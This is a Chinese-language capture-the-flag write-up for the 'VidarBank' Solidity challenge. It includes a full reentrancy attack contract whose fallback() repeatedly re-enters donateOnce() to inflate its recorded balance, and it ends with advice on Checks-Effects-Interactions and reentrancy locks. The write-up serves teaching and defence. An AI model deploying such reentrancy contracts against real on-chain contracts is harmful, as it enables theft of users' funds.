# VidarBank

## 题目简述

题目给出一个银行合约。攻击者需要先创建账户，再利用 `donateOnce()` 中外部调用与状态更新顺序不当的问题反复进入该函数，使攻击合约在银行中的记账余额达到判定阈值。

## 解题过程

`donateOnce()` 会向调用者控制的合约发起外部调用。攻击合约收到转账时进入 `fallback()`，此时受害合约的本轮状态尚未完全更新，因此可以再次调用 `donateOnce()`，形成重入链。

攻击合约如下：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface VidarBank {
    function balances(address account) external view returns (uint256);
    function newAccount() external payable;
    function donateOnce() external;
    function isSolved() external;
}

contract Attack {
    VidarBank public victim;

    constructor(address victimAddress) {
        victim = VidarBank(victimAddress);
    }

    fallback() external payable {
        if (victim.balances(address(this)) < 30) {
            victim.donateOnce();
        }
    }

    function exploit() external payable {
        require(msg.value == 0.001 ether, "need 0.001 ether");
        victim.newAccount{value: 0.001 ether}();
        victim.donateOnce();
        victim.isSolved();
    }
}
```

部署时把题目实例地址传给构造函数，然后携带 `0.001 ether` 调用 `exploit()`。调用过程如下：

```text
exploit
  -> newAccount
  -> donateOnce
       -> Attack.fallback
            -> donateOnce
                 -> Attack.fallback
                      -> ...
```

当 `balances(address(this))` 达到 `30` 后，`fallback()` 不再重入，调用栈逐层返回。最后调用 `isSolved()`，题目实例进入完成状态。

## 方法总结

重入攻击的核心不是函数名，而是“外部调用发生时，关键状态是否已经完成更新”。合约应遵循 Checks-Effects-Interactions：先检查条件，再更新余额等内部状态，最后进行外部交互；还可以配合重入锁。仅限制一次入口调用并不能阻止回调期间再次进入。
